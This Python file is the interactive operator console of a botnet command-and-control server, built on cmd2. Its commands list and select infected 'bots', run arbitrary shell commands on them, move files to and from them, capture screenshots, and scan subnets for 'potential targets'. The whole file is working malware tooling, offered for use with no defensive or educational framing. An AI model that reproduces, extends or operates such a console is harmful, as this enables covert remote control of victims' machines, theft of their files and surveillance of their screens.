from __future__ import annotations

import os
import sys
import cmd2
import json
import threading
import logging
import time
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple, Set
from pathlib import Path

from core.server import Server
from botnet.manager import BotnetManager
from network.scanner import Scanner
from utils.logger import AdvancedLogger
from utils.crypto import Crypto

class Console(cmd2.Cmd):
    """Interactive console for controlling C&C Server"""
    
    def __init__(self, server: Optional[Server] = None) -> None:
        """Initialize console
        
        Args:
            server (Optional[Server], optional): Server instance. Defaults to None.
        """
        super().__init__()
        
        # Components
        self.server = server or Server()
        self.botnet = BotnetManager()
        self.scanner = Scanner()
        self.logger = AdvancedLogger("console")
        self.crypto = Crypto()
        
        # Command history
        self.history_file = Path("history.txt") 
        self.max_history = 1000
        self.selected_bots: Set[str] = set()
        self._load_history()
        
        # Console settings
        self.prompt = 'C&C > '
        self.intro = self._get_banner()
        
    def preloop(self) -> None:
        """Setup before starting command loop"""
        try:
            if not self.server.running:
                if not self.server.initialize():
                    self.logger.error("Failed to initialize server")
                    sys.exit(1)
                self.server.start()
        except Exception as e:
            self.logger.error(f"Preloop error: {str(e)}")
            sys.exit(1)
            
    def postloop(self) -> None:
        """Cleanup after command loop ends"""
        try:
            self._save_history()
            self.server.stop()
            self.logger.info("Console stopped")
        except Exception as e:
            self.logger.error(f"Postloop error: {str(e)}")
            
    def do_list(self, args: str) -> None:
        """List all connected bots
        Usage: list"""
        try:
            bots = self.botnet.get_bots()
            if not bots:
                self.logger.info("No bots connected")
                return
                
            print("\nConnected Bots:")
            print("─" * 60)
            print("ID\tIP\t\tOS\t\tStatus\tLast Seen")
            print("─" * 60)
            
            for bot in bots:
                last_seen = datetime.fromtimestamp(bot.last_seen) if bot.last_seen else "Never"
                print(f"{bot.id}\t{bot.ip}\t{bot.os}\t{bot.status}\t{last_seen}")
                
        except Exception as e:
            self.logger.error(f"Error listing bots: {str(e)}")
            
    def do_select(self, args: str) -> None:
        """Select bot(s) to control
        Usage: select <id1,id2,...|all>"""
        if not args:
            self.logger.error("No bot ID provided")
            return
            
        try:
            if args.lower() == 'all':
                self.selected_bots = {bot.id for bot in self.botnet.get_bots()}
                self.logger.info(f"Selected all bots: {len(self.selected_bots)}")
                return
                
            bot_ids = {id.strip() for id in args.split(',')}
            valid_bots = set()
            
            for bot_id in bot_ids:
                if self.botnet.get_bot(bot_id):
                    valid_bots.add(bot_id)
                else:
                    self.logger.warning(f"Bot {bot_id} not found")
                    
            self.selected_bots = valid_bots
            if valid_bots:
                self.logger.info(f"Selected bots: {', '.join(valid_bots)}")
            
        except Exception as e:
            self.logger.error(f"Error selecting bots: {str(e)}")
            
    def do_unselect(self, args: str) -> None:
        """Unselect bot(s)
        Usage: unselect <id1,id2,...|all>"""
        try:
            if args.lower() == 'all':
                self.selected_bots.clear()
                self.logger.info("Unselected all bots")
                return
                
            bot_ids = {id.strip() for id in args.split(',')}
            self.selected_bots -= bot_ids
            self.logger.info(f"Unselected bots: {', '.join(bot_ids)}")
            
        except Exception as e:
            self.logger.error(f"Error unselecting bots: {str(e)}")
            
    def do_shell(self, args: str) -> None:
        """Execute shell command on selected bot(s)
        Usage: shell <command>"""
        if not args:
            self.logger.error("No command provided") 
            return
            
        if not self.selected_bots:
            self.logger.error("No bots selected")
            return
            
        try:
            for bot_id in self.selected_bots:
                print(f"\nExecuting on {bot_id}:")
                result = self.server.execute_command(bot_id, {
                    'type': 'shell',
                    'command': args
                })
                
                if result.get('status') == 'success':
                    print(result.get('output', ''))
                else:
                    self.logger.error(f"Command failed: {result.get('message')}")
                    
        except Exception as e:
            self.logger.error(f"Error executing shell command: {str(e)}")
            
    def do_upload(self, args: str) -> None:
        """Upload file to selected bot(s)
        Usage: upload <local_path> <remote_path>"""
        try:
            local_path, remote_path = args.split()
            
            if not Path(local_path).exists():
                self.logger.error(f"Local file not found: {local_path}")
                return
                
            if not self.selected_bots:
                self.logger.error("No bots selected")
                return
                
            for bot_id in self.selected_bots:
                result = self.server.execute_command(bot_id, {
                    'type': 'upload',
                    'local_path': local_path,
                    'remote_path': remote_path
                })
                
                if result.get('status') == 'success':
                    self.logger.info(f"Upload successful to {bot_id}")
                else:
                    self.logger.error(f"Upload failed to {bot_id}: {result.get('message')}")
                    
        except ValueError:
            self.logger.error("Invalid arguments. Usage: upload <local_path> <remote_path>")
        except Exception as e:
            self.logger.error(f"Error uploading file: {str(e)}")
            
    def do_download(self, args: str) -> None:
        """Download file from selected bot
        Usage: download <remote_path> <local_path>"""
        try:
            remote_path, local_path = args.split()
            
            if len(self.selected_bots) != 1:
                self.logger.error("Please select exactly one bot")
                return
                
            bot_id = next(iter(self.selected_bots))
            result = self.server.execute_command(bot_id, {
                'type': 'download',
                'remote_path': remote_path,
                'local_path': local_path
            })
            
            if result.get('status') == 'success':
                self.logger.info("Download successful")
            else:
                self.logger.error(f"Download failed: {result.get('message')}")
                
        except ValueError:
            self.logger.error("Invalid arguments. Usage: download <remote_path> <local_path>")
        except Exception as e:
            self.logger.error(f"Error downloading file: {str(e)}")
            
    def do_screenshot(self, args: str) -> None:
        """Take screenshot from selected bot(s)
        Usage: screenshot"""
        if not self.selected_bots:
            self.logger.error("No bots selected")
            return
            
        try:
            for bot_id in self.selected_bots:
                result = self.server.execute_command(bot_id, {
                    'type': 'screenshot'
                })
                
                if result.get('status') == 'success':
                    filename = result['filename']
                    self.logger.info(f"Screenshot saved from {bot_id}: {filename}")
                else:
                    self.logger.error(f"Screenshot failed from {bot_id}")
                    
        except Exception as e:
            self.logger.error(f"Error taking screenshot: {str(e)}")
            
    def do_scan(self, args: str) -> None:
        """Scan network for potential targets
        Usage: scan [subnet]"""
        try:
            subnet = args if args else None
            self.logger.info(f"Scanning network: {subnet or 'local'}")
            
            targets = self.scanner.scan(subnet)
            
            print("\nTargets found:")
            print("─" * 60)
            print("IP\t\tOS\t\tOpen Ports")
            print("─" * 60)
            
            for target in targets:
                ports = ','.join(map(str, target.get('open_ports', [])))
                print(f"{target['ip']}\t{target.get('os', 'Unknown')}\t{ports}")
                
        except Exception as e:
            self.logger.error(f"Error scanning network: {str(e)}")
            
    def do_exit(self, args: str) -> bool:
        """Exit the console
        Usage: exit"""
        print("\nExiting console...")
        return True
        
    def do_quit(self, args: str) -> bool:
        """Alias for exit"""
        return self.do_exit(args)
        
    def _load_history(self) -> None:
        """Load command history from file"""
        try:
            if self.history_file.exists():
                with open(self.history_file) as f:
                    self.history.extend(line.strip() for line in f)
        except Exception as e:
            self.logger.error(f"Error loading history: {str(e)}")
            
    def _save_history(self) -> None:
        """Save command history to file"""
        try:
            with open(self.history_file, 'w') as f:
                for cmd in self.history[-self.max_history:]:
                    f.write(f"{cmd}\n")
        except Exception as e:
            self.logger.error(f"Error saving history: {str(e)}")
            
    def _get_banner(self) -> str:
        """Get console banner

        Returns:
            str: Banner text
        """
        return """
╔═══════════════════════════════════════╗
║         Combined C&C Server           ║
║      Type 'help' for commands        ║
╚═══════════════════════════════════════╝
"""
        
    def default(self, line: str) -> None:
        """Handle unknown commands"""
        self.logger.error(f"Unknown command: {line}")
        
    def emptyline(self) -> bool:
        """Handle empty lines"""
        return False  # Don't repeat last command